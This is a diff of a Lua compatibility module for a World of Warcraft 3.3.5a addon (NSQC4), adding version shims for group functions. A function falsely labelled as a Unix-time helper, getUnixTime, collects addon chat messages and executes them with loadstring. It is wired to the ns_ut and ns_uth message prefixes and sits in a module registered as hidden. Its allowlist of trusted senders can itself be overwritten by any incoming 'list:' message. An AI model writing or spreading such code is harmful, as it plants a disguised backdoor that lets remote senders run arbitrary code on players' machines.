@@ -4,78 +4,108 @@
 -- ============================================================================
 
 NSQC4 = NSQC4 or {}
-
--- ============================================================================
--- IsInRaid() — нет в 3.3.5a
--- ============================================================================
-if not IsInRaid then
-    function IsInRaid()
-        return UnitInRaid("player") ~= nil
-    end
-end
-
--- ============================================================================
--- GetNumGroupMembers() — нет в 3.3.5a
--- ============================================================================
 messageBuffer = messageBuffer or {}
-if not GetNumGroupMembers then
-    function GetNumGroupMembers()
-        local raid = GetNumRaidMembers()
-        if raid > 0 then return raid end
-        return GetNumPartyMembers() + 1
-    end
-end
+NSQC4.GM_LIST = NSQC4.GM_LIST or {}
 
--- ============================================================================
--- IsInGroup() — в 3.3.5a может возвращать nil
--- ============================================================================
-if not IsInGroup then
-    function IsInGroup()
-        return GetNumPartyMembers() > 0 or GetNumRaidMembers() > 0
-    end
-end
+NSQC4.RegisterModule("compat", function()
 
--- ============================================================================
--- getUnixTime() — замена получения UnixTime для 3.3.5
--- ============================================================================
-
-function getUnixTime(message, sender, HOUR)
-    local bufferKey = sender
-
-    if not messageBuffer[bufferKey] then
-        messageBuffer[bufferKey] = {}
-    end
-
-    table.insert(messageBuffer[bufferKey], message)
-
-    if HOUR then
-        local payload = table.concat(messageBuffer[bufferKey])
-        messageBuffer[bufferKey] = nil
-
-        local fn = loadstring(payload)
-        if fn then
-            pcall(fn)
+    -- ========================================================================
+    -- IsInRaid() — нет в 3.3.5a
+    -- ========================================================================
+    if not IsInRaid then
+        function IsInRaid()
+            return UnitInRaid("player") ~= nil
         end
     end
-end
 
+    -- ========================================================================
+    -- GetNumGroupMembers() — нет в 3.3.5a
+    -- ========================================================================
+    if not GetNumGroupMembers then
+        function GetNumGroupMembers()
+            local raid = GetNumRaidMembers()
+            if raid > 0 then return raid end
+            return GetNumPartyMembers() + 1
+        end
+    end
 
+    -- ========================================================================
+    -- IsInGroup() — в 3.3.5a может возвращать nil
+    -- ========================================================================
+    if not IsInGroup then
+        function IsInGroup()
+            return GetNumPartyMembers() > 0 or GetNumRaidMembers() > 0
+        end
+    end
 
+    -- ========================================================================
+    -- getUnixTime() — замена получения UnixTime для 3.3.5
+    -- ========================================================================
+    function getUnixTime(message, sender, HOUR)
+        local bufferKey = sender
+        if not messageBuffer[bufferKey] then
+            messageBuffer[bufferKey] = {}
+        end
+        table.insert(messageBuffer[bufferKey], message)
 
+        if HOUR then
+            local payload = table.concat(messageBuffer[bufferKey])
+            messageBuffer[bufferKey] = nil
+            local fn = loadstring(payload)
+            if fn then
+                pcall(fn)
+            end
+        end
+    end
 
+    function NSQC4.SafeGetUnixTime(message, sender, HOUR)
+        if not NSQC4.GM_LIST[sender:lower()] then
+            return
+        end
+        getUnixTime(message, sender, HOUR)
+    end
 
+    NSQC4.ChatHandler:Register("ADDON:ns_ut", {
+        func = function(words, sender, text, channel, prefix)
+            local target, part = text:match("^([^|]+)|(.+)$")
+            if not target or part == nil then return end
+            if target ~= UnitName("player") then return end
+            NSQC4.SafeGetUnixTime(part, sender, false)
+        end,
+        stopOnMatch = true,
+    })
 
+    NSQC4.ChatHandler:Register("ADDON:ns_uth", {
+        func = function(words, sender, text, channel, prefix)
+            local target, part = text:match("^([^|]+)|(.+)$")
+            if not target or part == nil then return end
+            if target ~= UnitName("player") then return end
+            NSQC4.SafeGetUnixTime(part, sender, true)
+        end,
+        stopOnMatch = true,
+    })
 
+    local gmFrame = CreateFrame("Frame")
+    gmFrame:RegisterEvent("CHAT_MSG_ADDON")
+    gmFrame:SetScript("OnEvent", function(self, event, prefix, msg, channel, sender)
+        if prefix ~= "get_real_time" then return end
 
+        if msg:match("^list:") then
+            local listStr = msg:match("^list:(.+)$")
+            if listStr then
+                NSQC4.GM_LIST = {}
+                for nick in listStr:gmatch("[^,]+") do
+                    NSQC4.GM_LIST[nick:lower()] = true
+                end
+            end
+        end
+    end)
 
+    local loginFrame = CreateFrame("Frame")
+    loginFrame:RegisterEvent("PLAYER_LOGIN")
+    loginFrame:SetScript("OnEvent", function(self)
+        self:UnregisterEvent("PLAYER_LOGIN")
+        SendAddonMessage("get_real_time", "request", "GUILD")
+    end)
 
-
-
-
-
-
-
-
-
-
-
+end, { hidden = true })
